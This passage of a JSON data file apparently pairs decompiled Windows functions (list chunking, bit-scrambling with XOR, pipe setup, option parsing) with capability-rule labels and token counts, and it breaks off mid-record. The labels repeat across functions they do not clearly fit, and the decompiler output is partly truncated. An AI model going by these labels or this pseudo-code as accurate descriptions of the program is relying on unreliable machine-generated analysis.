        "decompiled_code": "\nint32_t __cdecl\nfcn.00070330(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t var_4h;\n    \n    var_4h = fcn.0006f8f0(arg_8h, arg_ch, arg_10h, 0);\n    if (var_4h == 0) {\n        var_4h = fcn.0006fd10(arg_8h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    }\n    return var_4h;\n}\n",
        "token_count": 154
    },
    "00070380": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00070380(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint *arg_14h, int32_t *arg_18h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    if (arg_10h == 0) {\n        puVar1 = fcn.00035200(0x10);\n        if (puVar1 == NULL) {\n            fcn.00070710(*arg_14h);\n            *arg_14h = 0;\n            uVar2 = 0x21590004;\n        }\n        else {\n            *puVar1 = 0;\n            puVar1[1] = 0;\n            puVar1[2] = 0;\n            puVar1[3] = 0;\n            *arg_14h = puVar1;\n            *arg_18h = 1;\n            uVar2 = 0;\n        }\n    }\n    else {\n        *arg_14h = 0;\n        *arg_18h = 0;\n        var_10h = NULL;\n        for (; var_ch < arg_10h; var_ch = var_ch + var_4h) {\n            if (*(arg_8h + 0xc) == *(arg_8h + 0x10)) {\n                if (*(arg_8h + 0xc) - *(arg_8h + 0x10) < 0x400) {\n                    var_4h = *(arg_8h + 0xc);\n                }\n                else {\n                    iVar3 = fcn.000785f8();\n                    var_4h = *(arg_8h + 0xc) - iVar3 % 0x401;\n                }\n            }\n            else {\n                iVar3 = fcn.000785f8();\n                var_4h = iVar3 % ((*(arg_8h + 0xc) - *(arg_8h + 0x10)) + 1) + *(arg_8h + 0x10);\n            }\n            if (arg_10h - var_ch < var_4h) {\n                var_4h = arg_10h - var_ch;\n            }\n            puVar1 = fcn.00035200(0x10);\n            if (puVar1 == NULL) {\n                fcn.00070710(*arg_14h);\n                *arg_14h = 0;\n                return 0x21590004;\n            }\n            *puVar1 = 0;\n            puVar1[1] = 0;\n            puVar1[2] = 0;\n            puVar1[3] = 0;\n            puVar1[1] = arg_ch + var_ch;\n            puVar1[2] = var_4h;\n            if (var_10h == NULL) {\n                *arg_14h = puVar1;\n            }\n            else {\n                *var_10h = puVar1;\n            }\n            *arg_18h = *arg_18h + 1;\n            var_10h = puVar1;\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 745
    },
    "00070530": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00070530(uint *arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *var_10h;\n    uint *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (1 < arg_ch) {\n        for (var_10h = arg_8h; var_10h != NULL; var_10h = *var_10h) {\n            iVar1 = fcn.000785f8();\n            var_ch = arg_8h;\n            for (var_4h = 0; (var_ch != NULL && (var_4h != iVar1 % arg_ch)); var_4h = var_4h + 1) {\n                var_ch = *var_ch;\n            }\n            if (var_ch == NULL) {\n                return;\n            }\n            if ((var_ch != var_10h) && (var_ch[3] != var_10h[3])) {\n                fcn.000707a0(var_10h, var_ch);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 244
    },
    "000705d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000705d0(int32_t arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = (*(arg_8h + 0xc) + *(arg_8h + 0x10)) / 2;\n    if ((arg_ch[2] <= iVar1) || (var_ch = iVar1,  iVar1 <= arg_ch[2] + (arg_ch[2] >> 0x1f & 3U) >> 2)) {\n        var_ch = arg_ch[2] / 2;\n    }\n    var_8h = arg_ch[2] - var_ch;\n    if ((0x400 < var_ch) && (var_8h + 0x400 <= iVar1)) {\n        iVar2 = fcn.000785f8();\n        var_ch = var_ch - iVar2 % 0x401;\n        var_8h = arg_ch[2] - var_ch;\n    }\n    if ((0x400 < var_8h) && (var_ch + 0x400 <= iVar1)) {\n        iVar1 = fcn.000785f8();\n        var_8h = var_8h - iVar1 % 0x401;\n        var_ch = arg_ch[2] - var_8h;\n    }\n    puVar3 = fcn.00035200(0x10);\n    if (puVar3 == NULL) {\n        uVar4 = 0x21590004;\n    }\n    else {\n        *puVar3 = 0;\n        puVar3[1] = 0;\n        puVar3[2] = 0;\n        puVar3[3] = 0;\n        puVar3[2] = var_8h;\n        puVar3[3] = arg_ch[3];\n        puVar3[1] = arg_ch[1] + var_ch;\n        arg_ch[2] = var_ch;\n        *puVar3 = *arg_ch;\n        *arg_ch = puVar3;\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 513
    },
    "00070710": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00070710(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint var_4h;\n    \n    while (arg_8h != NULL) {\n        puVar1 = *arg_8h;\n        fcn.00035330(arg_8h);\n        arg_8h = puVar1;\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "00070740": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00070740(int32_t **arg_8h)\n\n{\n    int32_t **var_8h;\n    int32_t **var_4h;\n    \n    for (var_4h = arg_8h; *var_4h != NULL; var_4h = *var_4h) {\n        for (var_8h = *var_4h; var_8h != NULL; var_8h = *var_8h) {\n            if (var_8h[3] < var_4h[3]) {\n                fcn.000707a0(var_4h, var_8h);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "00070820": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00070820(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint8_t var_9h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00035200(arg_ch);\n    if (iVar1 == 0) {\n        iVar1 = 0;\n    }\n    else if (arg_ch < 0xb) {\n        fcn.0007877e(iVar1, arg_8h, arg_ch);\n    }\n    else {\n        var_24h = arg_ch;\n        var_1ch = 0;\n        do {\n            var_1ch = var_24h % 10 + var_1ch;\n            var_24h = var_24h / 10;\n        } while (0 < var_24h);\n        var_8h = 0;\n        var_18h = 0;\n        var_9h = 0;\n        for (var_10h = 0; var_10h < arg_ch / var_1ch; var_10h = var_10h + 1) {\n            for (var_4h = 0; var_4h < 8; var_4h = var_4h + 1) {\n                for (var_14h = 0; var_14h < var_1ch; var_14h = var_14h + 1) {\n                    var_9h = var_9h | ((*(arg_8h + (arg_ch / var_1ch) * var_14h + var_10h) & 1 << (var_4h & 0x1f)) >>\n                                      (var_4h & 0x1f)) << (var_18h & 0x1f);\n                    var_18h = var_18h + 1;\n                    if (7 < var_18h) {\n                        *(iVar1 + var_8h) = var_9h;\n                        var_8h = var_8h + 1;\n                        var_9h = 0;\n                        var_18h = 0;\n                    }\n                }\n            }\n        }\n        var_10h = 0;\n        for (; var_8h < arg_ch; var_8h = var_8h + 1) {\n            *(iVar1 + var_8h) = *(arg_8h + var_8h) ^ *(iVar1 + var_10h);\n            var_10h = var_10h + 1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 634
    },
    "000709c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000709c0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint8_t *arg_8h_00;\n    int32_t iVar2;\n    uint8_t var_21h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_ch < 0xb) {\n        uVar1 = 0;\n    }\n    else {\n        arg_8h_00 = fcn.00035200(arg_ch);\n        if (arg_8h_00 == NULL) {\n            uVar1 = 0x21590004;\n        }\n        else {\n            fcn.0007877e(arg_8h_00, arg_8h, arg_ch);\n            fcn.00078790(arg_8h, 0, arg_ch);\n            var_20h = arg_ch;\n            var_1ch = 0;\n            do {\n                var_1ch = var_20h % 10 + var_1ch;\n                var_20h = var_20h / 10;\n            } while (0 < var_20h);\n            iVar2 = arg_ch / var_1ch;\n            var_8h = 0;\n            var_21h = *arg_8h_00;\n            var_ch = 1;\n            for (var_10h = 0; var_10h < iVar2; var_10h = var_10h + 1) {\n                for (var_4h = 0; var_4h < 8; var_4h = var_4h + 1) {\n                    for (var_18h = 0; var_18h < var_1ch; var_18h = var_18h + 1) {\n                        *(arg_8h + iVar2 * var_18h + var_10h) =\n                             *(arg_8h + iVar2 * var_18h + var_10h) |\n                             ((var_21h & 1 << (var_8h & 0x1f)) >> (var_8h & 0x1f)) << (var_4h & 0x1f);\n                        var_8h = var_8h + 1;\n                        if (7 < var_8h) {\n                            var_21h = arg_8h_00[var_ch];\n                            var_ch = var_ch + 1;\n                            var_8h = 0;\n                        }\n                    }\n                }\n            }\n            var_10h = 0;\n            for (var_ch = var_ch + -1; var_ch < arg_ch; var_ch = var_ch + 1) {\n                *(arg_8h + var_ch) = arg_8h_00[var_ch] ^ arg_8h_00[var_10h];\n                var_10h = var_10h + 1;\n            }\n            fcn.00035330(arg_8h_00);\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 724
    },
    "00070ba0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00070ba0(int32_t arg_8h, unkbyte3 *arg_ch, int32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    uint var_8h;\n    uint var_1h;\n    \n    if (arg_10h == 0) {\n        return 0;\n    }\n    if (*arg_ch == '\\x01') {\n        if (arg_10h != 3) {\n            return 0;\n        }\n        var_8h._1_2_ = *arg_ch >> 8;\n        uVar1 = fcn.000354c0(arg_ch & 0xffff0000 | var_8h._1_2_);\n        if (uVar1 == 0) {\n            return 0;\n        }\n        *(arg_8h + 0x10) = uVar1;\n        *(arg_8h + 0xc) = *(arg_8h + 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 247
    },
    "00070c20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00070c20(int32_t *arg_8h, uint noname_1, char *arg_10h, char *arg_14h, char *arg_18h, char *arg_1ch, \n            uint32_t arg_20h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint var_38h;\n    uint var_30h;\n    char *var_2ch;\n    uint var_28h;\n    uint var_20h;\n    char *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    var_4h = fcn.00035200(0x3c);\n    if (var_4h == 0) {\n        var_10h = 0x21590004;\n        goto code_r0x00070db8;\n    }\n    fcn.00078790(var_4h, 0, 0x3c);\n    if (arg_10h != NULL) {\n        if ((arg_20h & 1) == 0) {\n            var_10h = 0x215900c9;\n            goto code_r0x00070db8;\n        }\n        if (arg_10h[arg_14h + -1] == '\\0') {\n            var_1ch = arg_10h;\n            do {\n                cVar1 = *var_1ch;\n                var_1ch = var_1ch + 1;\n            } while (cVar1 != '\\0');\n            if (var_1ch + (1 - (arg_10h + 1)) == arg_14h) {\n                fcn.00078760(&var_ch, arg_10h);\n                iVar2 = fcn.00078754(var_4h + 4, &var_ch, 1);\n                if (iVar2 != 0) {\n                    var_10h = 0x21590004;\n                    goto code_r0x00070db8;\n                }\n                fcn.000344f0(var_4h + 0x20);\n                goto code_r0x00070d08;\n            }\n        }\n        var_10h = 0x21590067;\n        goto code_r0x00070db8;\n    }\ncode_r0x00070d08:\n    if (arg_18h == NULL) {\ncode_r0x00070da9:\n        *arg_8h = var_4h;\n        var_10h = 0;\n    }\n    else {\n        if ((arg_20h & 2) == 0) {\n            var_10h = 0x215900cb;\n            goto code_r0x00070db8;\n        }\n        if (arg_18h[arg_1ch + -1] == '\\0') {\n            var_2ch = arg_18h;\n            do {\n                cVar1 = *var_2ch;\n                var_2ch = var_2ch + 1;\n            } while (cVar1 != '\\0');\n            if (var_2ch + (1 - (arg_18h + 1)) == arg_1ch) {\n                fcn.00078760(&var_ch, arg_18h);\n                iVar2 = fcn.00078754(var_4h + 0xc, &var_ch, 1);\n                if (iVar2 != 0) {\n                    var_10h = 0x21590004;\n                    goto code_r0x00070db8;\n                }\n                goto code_r0x00070da9;\n            }\n        }\n        var_10h = 0x21590069;\n    }\ncode_r0x00070db8:\n    if ((var_10h != 0) && (var_4h != 0)) {\n        fcn.00078766(var_4h + 4);\n        fcn.00078766(var_4h + 0xc);\n        fcn.00035330(var_4h);\n    }\n    return var_10h;\n}\n",
        "token_count": 912
    },
    "00070e00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00070e00(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    *(arg_8h + 0x18) = 1;\n    iVar1 = *(arg_8h + 0x14);\n    *(arg_8h + 0x14) = 0;\n    if (iVar1 != 0) {\n        fcn.00078544(iVar1);\n    }\n    iVar1 = *(arg_8h + 0x1c);\n    *(arg_8h + 0x1c) = 0;\n    if (iVar1 != 0) {\n        fcn.00078544(iVar1);\n        fcn.00034550(arg_8h + 0x20);\n        fcn.000345c0(arg_8h + 0x20);\n    }\n    return;\n}\n",
        "token_count": 200
    },
    "00070e70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00070e70(int32_t arg_8h)\n\n{\n    if (*(arg_8h + 8) != 0) {\n        fcn.00034520(arg_8h + 0x20);\n    }\n    fcn.00078766(arg_8h + 4);\n    fcn.00078766(arg_8h + 0xc);\n    fcn.00035330(*(arg_8h + 0x2c));\n    fcn.00035330(*(arg_8h + 0x38));\n    fcn.00035330(arg_8h);\n    return;\n}\n",
        "token_count": 139
    },
    "00070ed0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x00070f57\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00070ed0(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(arg_8h + 0x14) == 0) && (*(arg_8h + 0x10) != 0)) {\n        var_38h = 0x18;\n        var_34h = 0;\n        var_2ch = 0x40;\n        var_30h = arg_8h + 0xc;\n        var_28h = 0;\n        if (0 < *(arg_8h + 0x24)) {\n            var_20h = 0xc;\n            var_18h._0_1_ = 0;\n            var_18h._1_1_ = 0;\n            if (*(arg_8h + 0x24) - 1U < 4) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        var_24h = 0;\n        var_14h = fcn.0001ec90(arg_8h + 0x14, 0xc0000000, &var_38h, &var_10h, 0, 0, 0, 1, 0, 0, 0);\n        if (var_14h == 0) {\n            var_8h = 1;\n            var_4h = 0;\n            var_14h = fcn.0007855c(*(arg_8h + 0x14), &var_10h, &var_8h, 8, 0x17);\n            if (var_14h == 0) {\n                uVar1 = 0;\n            }\n            else {\n                fcn.00078544(*(arg_8h + 0x14));\n                *(arg_8h + 0x14) = 0;\n                uVar1 = fcn.000785b6(var_14h);\n            }\n        }\n        else {\n            uVar1 = fcn.000785b6(var_14h);\n        }\n    }\n    else {\n        uVar1 = 0x21590065;\n    }\n    return uVar1;\n}\n",
        "token_count": 624
    },
    "00071030": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Variable defined which should be unmapped: var_44h\n\nint32_t __cdecl fcn.00071030(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t var_60h;\n    uint *var_5ch;\n    uint var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint *var_4h;\n    \n    var_4h = NULL;\n    var_10h = 0;\n    var_40h = 0;\n    uVar3 = 0;\n    var_3ch = fcn.0007863a(&fcn.00071030::var_5ch, 0x10000000, 0, 1, 0);\n    if (var_3ch != 0) {\n        iVar1 = fcn.000785b6(var_3ch);\n        return iVar1;\n    }\n    iVar1 = fcn.00036da0(&fcn.00071030::var_10h);\n    var_3ch = iVar1;\n    if (iVar1 == 0) {\n        var_58h = 0x18;\n        var_54h = 0;\n        var_4ch = 0x40;\n        var_50h = arg_8h + 4;\n        var_48h = var_10h;\n        var_44h = 0;\n        var_14h = 0;\n        var_38h = 1;\n        var_34h = 1;\n        var_30h = 0;\n        var_2ch = 0xff;\n        var_28h = 0x1000;\n        var_24h = 0x1000;\n        var_20h = 0xfff85ee0;\n        var_1ch = 0xffffffff;\n        var_18h = 1;\n        iVar1 = (**0xb1bde140)(&fcn.00071030::var_4h, 0xc0000000, &fcn.00071030::var_58h, &fcn.00071030::var_ch, 0, 0, 3\n                               , 3, 0, 0, 0, 1, &fcn.00071030::var_38h, 0);\n        var_3ch = iVar1;\n        if (iVar1 == 0) {\n            var_44h = arg_8h + 0x20;\n            var_48h = 0x71173;\n            fcn.00034550(var_44h);\n            if (*(arg_8h + 0x18) == '\\0') {\n                *(arg_8h + 0x1c) = var_4h;\n                var_48h = 0;\n                var_4ch = 0;\n                var_50h = 0;\n                var_54h = 0;\n                var_58h = 0x110008;\n                var_5ch = &fcn.00071030::var_ch;\n                puVar2 = var_4h;\n                var_3ch = fcn.0007875a(uVar3, var_5ch, 0, 0);\n                if (var_3ch == 0x103) {\n                    puVar2 = var_5ch;\n                    var_3ch = fcn.000785ec(var_5ch, 0, 0);\n                    if (var_3ch != 0) {\n                        var_60h = fcn.000785b6(var_3ch);\n                        var_4h = *(arg_8h + 0x1c);\n                        *(arg_8h + 0x1c) = 0;\n                        iVar1 = arg_8h + 0x20;\n                        fcn.000345c0(iVar1);\n                        goto code_r0x00071312;\n                    }\n                    var_3ch = var_ch;\n                }\n                if (var_3ch == 0) {\n                    if (*(arg_8h + 0x1c) == 0) {\n                        var_60h = 0x21590006;\n                        iVar1 = arg_8h + 0x20;\n                        fcn.000345c0(iVar1);\n                    }\n                    else {\n                        *(arg_8h + 0x1c) = 0;\n                        iVar1 = arg_8h + 0x20;\n                        fcn.000345c0(iVar1);\n                        var_40h = fcn.00035200(0x3c);\n                        if (var_40h == 0) {\n                            var_60h = 0x21590004;\n                        }\n                        else {\n                            fcn.00078790(var_40h, 0, 0x3c, iVar1, puVar2);\n                            *(var_40h + 0x14) = var_4h;\n                            *(var_40h + 0x28) = *(arg_8h + 0x28);\n                            *(var_40h + 0x34) = *(arg_8h + 0x34);\n                            if (*(arg_8h + 0x38) != 0) {\n                                uVar3 = fcn.00035360(*(arg_8h + 0x38));\n                                *(var_40h + 0x38) = uVar3;\n                                if (*(var_40h + 0x38) != 0) {\n                                    var_60h = 0x21590004;\n                                    goto code_r0x00071312;\n                                }\n                            }\n                            *arg_ch = var_40h;\n                            var_60h = 0;\n                        }\n                    }\n                }\n                else {\n                    var_60h = fcn.000785b6(var_3ch);\n                    var_4h = *(arg_8h + 0x1c);\n                    *(arg_8h + 0x1c) = 0;\n                    iVar1 = arg_8h + 0x20;\n                    fcn.000345c0(iVar1);\n                }\n            }\n            else {\n                iVar1 = arg_8h + 0x20;\n                var_4ch = 0x7118a;\n                fcn.000345c0(iVar1);\n                var_60h = 0x21590006;\n            }\n        }\n        else {\n            var_48h = 0x7115f;\n            var_60h = fcn.000785b6();\n        }\n    }\n    else {\n        var_60h = fcn.000785b6(iVar1);\n    }\ncode_r0x00071312:\n    if (var_60h != 0) {\n        if (var_4h != NULL) {\n            fcn.00078544(var_4h, iVar1);\n        }\n        fcn.00035330(var_40h);\n    }\n    fcn.00036f20(var_10h);\n    fcn.00078544(var_5ch);\n    return var_60h;\n}\n",
        "token_count": 1709
    },
    "00071350": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_b4h\n// WARNING: Variable defined which should be unmapped: var_b0h\n// WARNING: Variable defined which should be unmapped: var_a8h\n\nuint __cdecl fcn.00071350(int32_t arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    bool bVar4;\n    uint var_b4h;\n    int32_t var_b0h;\n    uint *var_a8h;\n    uint8_t *var_a4h;\n    uint var_a0h;\n    int32_t var_9ch;\n    uint *var_94h;\n    uint8_t *var_90h;\n    uint var_8ch;\n    uint var_88h;\n    char *var_8h;\n    uint var_4h;\n    \n    var_4h = arg_ch;\ncode_r0x0007135f:\n    do {\n        iVar2 = fcn.00077cd0(&var_4h, &var_88h, 0x80, &var_8h);\n        if (iVar2 == 0) {\n            return 0;\n        }\n        var_90h = 0xb1be2938;\n        var_94h = &var_88h;\n        do {\n            uVar1 = *var_94h;\n            bVar4 = uVar1 < *var_90h;\n            if (uVar1 != *var_90h) {\ncode_r0x000713f4:\n                var_9ch = (1 - bVar4) - (bVar4 != 0);\n                goto code_r0x000713ff;\n            }\n            if (uVar1 == 0) break;\n            uVar1 = *(var_94h + 1);\n            bVar4 = uVar1 < var_90h[1];\n            if (uVar1 != var_90h[1]) goto code_r0x000713f4;\n            var_94h = var_94h + 2;\n            var_90h = var_90h + 2;\n        } while (uVar1 != 0);\n        var_9ch = 0;\ncode_r0x000713ff:\n        if ((var_9ch == 0) && ((*var_8h == '1' || (*var_8h == 'Y')))) {\n            if (*(arg_8h + 0x2c) != 0) {\n                return 0x21590064;\n            }\n            *(arg_8h + 0x28) = 1;\n            goto code_r0x0007135f;\n        }\n        var_a4h = 0xb1be2948;\n        var_a8h = &var_88h;\n        do {\n            uVar1 = *var_a8h;\n            bVar4 = uVar1 < *var_a4h;\n            if (uVar1 != *var_a4h) {\ncode_r0x000714c5:\n                var_b0h = (1 - bVar4) - (bVar4 != 0);\n                goto code_r0x000714d0;\n            }\n            if (uVar1 == 0) break;\n            uVar1 = *(var_a8h + 1);\n            bVar4 = uVar1 < var_a4h[1];\n            if (uVar1 != var_a4h[1]) goto code_r0x000714c5;\n            var_a8h = var_a8h + 2;\n            var_a4h = var_a4h + 2;\n        } while (uVar1 != 0);\n        var_b0h = 0;\ncode_r0x000714d0:\n        if (var_b0h == 0) {\n            if (*(arg_8h + 0x38) != 0) {\n                return 0x21590064;\n            }\n            *(arg_8h + 0x34) = 1;\n            uVar3 = fcn.00035360(var_8h);\n            *(arg_8h + 0x38) = uVar3;\n            if (*(arg_8h + 0x38) == 0) {\n                return 0x21590004;\n            }\n        }\n        else {\n            iVar2 = fcn.0007861c(&var_88h, 0xb1be2958);\n            if (iVar2 == 0) {\n                iVar2 = fcn.00035fe0(*var_8h);\n                if (iVar2 == 0x41) {\n                    *(arg_8h + 0x24) = 1;\n                }\n                else {\n                    iVar2 = fcn.00035fe0(*var_8h);\n                    if (iVar2 == 0x49) {\n                        iVar2 = fcn.00035fe0(var_8h[1]);\n                        if (iVar2 == 0x44) {\n                            *(arg_8h + 0x24) = 2;\n                        }\n                        else {\n                            iVar2 = fcn.00035fe0(var_8h[1]);\n                            if (iVar2 != 0x4d) {\n                                return 0x21590066;\n                            }\n                            *(arg_8h + 0x24) = 3;\n                        }\n                    }\n                    else {\n                        iVar2 = fcn.00035fe0(*var_8h);\n                        if (iVar2 != 0x44) {\n                            return 0x21590066;\n                        }\n                        *(arg_8h + 0x24) = 4;\n                    }\n                }\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 1255
    },
    "00071620": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00071620(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    uint var_24h;\n    uint var_1ch;\n    char *var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*(arg_8h + 0x14) == 0) {\n        iVar2 = 0x21590065;\n    }\n    else {\n        iVar2 = fcn.00036f40(arg_8h + 0x34, 0);\n        if (iVar2 != 0) {\n            var_18h = *(arg_8h + 0x38);\n            pcVar3 = var_18h + 1;\n            do {\n                cVar1 = *var_18h;\n                var_18h = var_18h + 1;\n            } while (cVar1 != '\\0');\n            iVar2 = fcn.00071620(arg_8h, *(arg_8h + 0x38), var_18h + (1 - pcVar3));\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n        if (arg_10h == 0) {\n            iVar2 = 0;\n        }\n        else {\n            var_ch = fcn.0007863a(&var_10h, 0x10000000, 0, 1, 0);\n            if (var_ch == 0) {\n                var_ch = fcn.00078574(*(arg_8h + 0x14), var_10h, 0, 0, &var_8h, arg_ch, arg_10h, 0, 0);\n                if (var_ch == 0x103) {\n                    var_ch = fcn.000785ec(var_10h, 0, 0);\n                    if (var_ch != 0) {\n                        fcn.00078544(var_10h);\n                        iVar2 = fcn.000785b6(var_ch);\n                        return iVar2;\n                    }\n                    var_ch = var_8h;\n                }\n                fcn.00078544(var_10h);\n                if ((var_ch == 0) && (var_4h != arg_10h)) {\n                    iVar2 = -1;\n                }\n                else if ((var_ch == -0x3ffffeb5) || (var_ch == 